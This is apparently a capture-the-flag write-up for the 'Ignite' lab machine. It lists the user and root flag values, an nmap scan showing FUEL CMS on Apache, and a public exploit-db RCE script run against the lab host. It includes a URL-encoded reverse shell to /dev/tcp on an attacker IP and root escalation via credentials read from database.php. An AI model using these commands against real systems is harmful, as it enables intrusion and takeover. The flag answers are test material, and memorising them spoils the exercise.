# Ignite
##### Question 1: user flag
Answer
```bash
6470e394cbf6dab6a91682cc8585059b
```

##### Question 2:Root Flag
Answer
```bash
b9bbcb33e11b80be759c4e844862482d
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Nmap Scans:
```bash

Nmap scan report for 10.10.236.194
Host is up (0.10s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:


```

RCE: https://www.exploit-db.com/exploits/49487
```bash
gem install docopt

ruby 49487.rb http://10.10.236.194/ 'whoami'



# echo rev shell to file
ruby 49487.rb http://10.10.236.194/ 'echo%20%22sh%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E6%2E32%2E32%2F1234%200%3E%261%22%20%3E%20%20test%2Esh'

# make it executable
ruby 49487.rb http://10.10.236.194/ 'chmod%20%2Bx%20test%2Esh'

# Get Shell
ruby 49487.rb http://10.10.236.194/ 'bash%20test%2Esh'

```

```bash

priv esc - root creds

cat /var/www/html/fuel/application/config/database.php
root:mememe

su root

```